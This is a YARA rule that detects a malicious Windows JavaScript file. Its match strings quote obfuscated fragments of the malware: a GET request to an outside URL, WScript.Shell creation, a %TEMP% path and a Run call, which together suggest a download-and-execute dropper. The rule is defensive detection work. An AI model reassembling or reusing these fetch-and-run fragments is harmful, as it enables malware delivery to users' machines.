rule sig_20160427_40b43a74d357846f42074be0f06e5685 {
  meta:
    description = "datamaliciousorder - file 20160427_40b43a74d357846f42074be0f06e5685.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "42e1215f94229ec80b78eb843674a242e4295cfb4d355791dc427abe791c165e"

  strings:
    $s1  = "FqgwiRgial[SjgggEblqm](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/ur8fgs\", false);" fullword ascii
    $s2  = "function JzawfMrsau() {return PsbpaVawvy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"YWrfBum" ascii
    $s3  = "function JzawfMrsau() {return PsbpaVawvy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"YWrfBum" ascii
    $s4  = "function TeludTdrhn(HmcddXzglw, VjzwiQfcoe){YoyjyEtfvi = YoyjyEtfvi * 1; return HmcddXzglw - VjzwiQfcoe;};" fullword ascii
    $s5  = "var PsbpaVawvy = function EwmbeZedsf() {return NiyyaCgnwr[HrbhoIkyvj](\"WScript\"+\".Shell\");}(), PcqtyEesdv = 11;" fullword ascii
    $s6  = "var NiyyaCgnwr = this[\"WScript\"];" fullword ascii
    $s7  = "if (FqgwiRgial[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function WdychCyjnr(){return WdnaeLkddk + \"\";};" fullword ascii
    $s9  = "function ZnyggOukax() {return ((MllxdKpokz == true) && (MllxdKpokz == FbotnZxhou)) ? 1 : YoyjyEtfvi;};" fullword ascii
    $s10 = "FbotnZxhou = true; " fullword ascii
    $s11 = "MllxdKpokz = true; " fullword ascii
    $s12 = "var FbotnZxhou = false;" fullword ascii
    $s13 = "function PqahoEzthz(){return 23;};" fullword ascii
    $s14 = "function EawilTwmdi()" fullword ascii
    $s15 = "function UdlttQygvv(MkpxzWxwct) {var VsdjbYlvkz = (1, 2, 3, 4, 5, MkpxzWxwct); return VsdjbYlvkz;};" fullword ascii
    $s16 = "}while (KgrqbLwmkl);" fullword ascii
    $s17 = "function EntrbKimin(){return HrbhoIkyvj;};" fullword ascii
    $s18 = "var VwjgyRwdew = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function EyxkjKyaee(QjjctXtjik){PsbpaVawvy[\"R\"+\"un\"](QjjctXtjik, YoyjyEtfvi, YoyjyEtfvi);};" fullword ascii
    $s20 = "var YtrxfYvcph = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}